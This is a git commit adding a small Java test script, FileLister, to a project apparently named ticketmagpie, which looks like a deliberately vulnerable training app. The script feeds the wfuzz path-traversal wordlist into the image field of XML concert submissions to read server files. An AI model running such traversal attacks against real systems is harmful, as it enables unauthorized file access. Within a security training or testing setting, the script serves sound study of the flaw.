47f73688789c770dfa9ba98682128557277ced67
Peter Kofler <peter.kofler@code-cop.org>
2020-03-27 12:00:36 +0100

    Minimal script to do directory traversal.

--- src/test/java/com/ticketmagpie/experimental/FileLister.java
+++ src/test/java/com/ticketmagpie/experimental/FileLister.java
@@ -1,6 +1,12 @@
 package com.ticketmagpie.experimental;
 
+import java.io.File;
 import java.io.IOException;
+import java.net.URISyntaxException;
+import java.net.URL;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.util.List;
 
 import org.springframework.http.HttpStatus;
 import org.springframework.http.ResponseEntity;
@@ -9,7 +15,7 @@ import com.ticketmagpie.ApiClient;
 
 public class FileLister {
 
-  private ApiClient apiClient = new ApiClient("http://127.0.0.1:8080");
+  private ApiClient apiClient = new ApiClient("http://magpie:8080");
 
   public int createWithImage(String image) throws IOException {
     String sendXml = "" //
@@ -20,6 +26,7 @@ public class FileLister {
         + "  <image>" + image + "</image>" //
         + "</concert>";
 
+    System.out.println("POST " + image);
     ResponseEntity<String> response = apiClient.post("/api/concerts.xml", sendXml);
     if (!response.getStatusCode().equals(HttpStatus.CREATED)) {
       throw new IOException(response.getStatusCode().getReasonPhrase());
@@ -42,6 +49,26 @@ public class FileLister {
     }
 
     return response.getBody();
+  }
+
+  public static void main(String[] args) throws IOException, URISyntaxException {
+    new FileLister().list();
+  }
+
+  private void list() throws IOException, URISyntaxException {
+    List<String> words = readWordList();
+    for (String word : words) {
+      int id = createWithImage(word);
+      String image = readImage(id);
+      System.out.println(image);
+    }
+  }
+
+  private List<String> readWordList() throws URISyntaxException, IOException {
+    // https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/Traversal.txt
+    URL resource = getClass().getClassLoader().getResource("Wfuzz_Traversal.txt");
+    Path path = new File(resource.toURI()).toPath();
+    return Files.readAllLines(path);
   }
 
 }
